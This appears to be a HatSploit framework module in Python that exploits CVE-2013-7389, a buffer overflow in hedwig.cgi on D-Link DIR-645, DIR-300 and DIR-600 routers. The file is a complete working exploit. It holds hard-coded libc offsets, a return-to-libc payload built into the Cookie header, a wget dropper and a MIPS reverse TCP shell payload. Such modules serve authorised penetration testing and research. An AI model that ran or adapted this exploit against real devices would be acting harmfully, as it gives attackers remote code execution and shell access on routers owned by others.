"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import struct

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP

from pex.string import String


class HatSploitModule(Module, Handler, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "D-Link hedwig Remote Code Execution",
            'Module': "exploit/linux/dlink/hedwig_code_execution",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Roberto Paleari - vulnerability researcher",
            ],
            'Description': (
                "Remote Code Execution in D-Link DIR-645 <= 1.03, DIR-300 <= 2.14, DIR-600."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Targets': {
                'D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600': {
                    'Offset': 973,
                    'LibcBase': 0x2aaf800,
                    'System': 0x000531ff,
                    'CalcSystem': 0x000158c8,
                    'CallSystem': 0x000159cc
                },
                'D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600 (QEMU)': {
                    'Offset': 973,
                    'LibcBase': 0x40854000,
                    'System': 0x000531ff,
                    'CalcSystem': 0x000158c8,
                    'CallSystem': 0x000159cc
                }
            },
            'Payload': {
                PayloadDropMixin: {
                    'Value': "linux/mipsle/shell_reverse_tcp",
                    'Platform': [OS_LINUX, OS_UNIX],
                    'Arch': [ARCH_MIPSLE, ARCH_MIPSBE],
                }
            },
            'Devices': [
                "D-Link DIR-645 v1.03",
                "D-Link DIR-300 v2.14",
                "D-Link DIR-600"
            ],
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/27283'},
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2013-7389'},
                {'CVE': '2013-7389'},
                {'EDB': 27283},
            ],
            'DisclosureDate': "2014-07-07",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [RELIABLE_SESSION],
                'SideEffects': [],
            }
        })

    def __call__(self):
        self.dropper.set('wget')

    def exploit(self, command):
        command = command.encode("utf-8")

        shellcode = String().random_string(self.target['Offset']).encode("utf-8")
        shellcode += struct.pack("<I", self.target['LibcBase'] + self.target['System'])
        shellcode += String().random_string(16).encode("utf-8")
        shellcode += struct.pack("<I", self.target['LibcBase'] + self.target['CallSystem'])
        shellcode += String().random_string(12).encode("utf-8")
        shellcode += struct.pack("<I", self.target['LibcBase'] + self.target['CalcSystem'])
        shellcode += String().random_string(16).encode("utf-8")
        shellcode += command

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": b"uid=" + shellcode + b";",
        }

        data = {String().random_string(7): String().random_string(7)}

        response = self.http_request(
            method="POST",
            path='/hedwig.cgi',
            data=data,
            headers=headers,
        )

        if response:
            return response.text[response.text.find("</hedwig>") + len("</hedwig>"):].strip()

        return 'no response'

    def check(self):
        response = self.http_request(
            method="GET",
            path="/hedwig.cgi"
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            concat="&&",
            linemax=200,
            sender=self.exploit,
        )
